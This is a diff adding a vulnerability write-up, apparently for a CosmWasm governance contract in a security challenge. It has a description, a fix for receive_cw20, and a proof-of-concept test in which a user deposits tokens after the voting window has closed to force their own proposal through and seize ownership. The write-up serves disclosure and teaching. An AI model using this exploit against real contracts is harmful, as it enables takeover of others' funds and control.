@@ -747,16 +747,124 @@ pub fn accept_owner(deps: DepsMut, info: MessageInfo) -> Result<Response, Contra
 
 ### Description
 
-The bug occurs in ...
+The receive_cw20() for cw20 tokens, under src/contract.rs will allow users to still deposit tokens
+after the end of the voting window, or from any address and not just voting_token address.
+Basically the solidity equivalent would be a payable fallback that always returns true and doesn't revert.
+So if some user submits a proposal and it fails, they can still deposit after the end of the voting period but
+before resolve_proposal() has been called, then call it to execute the proposal.
+
+Also the contract doesn't seem to refund users if a proposal fails, so their stake can be reused for another proposal.
+I think either this should be changed, or, if the intention is to allow voting on a *single* proposal, then there
+should be no ability to propose a new one after the first fails (if that makes sense).
 
 ### Recommendation
 
-The fix should be ...
+Change the receive function:
+```rust
+pub fn receive_cw20(
+    deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    cw20_msg: Cw20ReceiveMsg,
+) -> Result<Response, ContractError> {
+    let config = CONFIG.load(deps.storage)?;
+    let current_proposal = PROPOSAL.load(deps.storage)?;
+
+    match from_binary(&cw20_msg.msg) {
+        Ok(Cw20HookMsg::CastVote {}) => {
+            if config.voting_token != info.sender {
+                return Err(ContractError::Unauthorized {});
+            }
+
+            if current_proposal
+                .timestamp
+                .plus_seconds(config.voting_window)
+                < env.block.time
+            {
+                return Err(ContractError::VotingWindowClosed {});
+            }
+
+            Ok(Response::default()
+                .add_attribute("action", "Vote casting")
+                .add_attribute("voter", cw20_msg.sender)
+                .add_attribute("power", cw20_msg.amount))
+        }
+        _ => Err(ContractError::Unauthorized {}),
+    }
+}
+```
+
+And also have a way to refund users after a proposal has ended, so their funds can't be used in the next proposal
 
 ### Proof of concept
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // User1 propose themselves
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+
+        // Admin votes, simulates msg from CW20 contract
+        // not enough to reach consensus
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(50_001),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // deposit additional funds after voting window has closed
+        let send_msg = Binary::from(r#"{"some":123}"#.as_bytes());
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr,
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg: send_msg,
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // User1 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));
+
+        // Check ownership transfer
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, USER1.to_string());
+    }
 ```
 
 ---
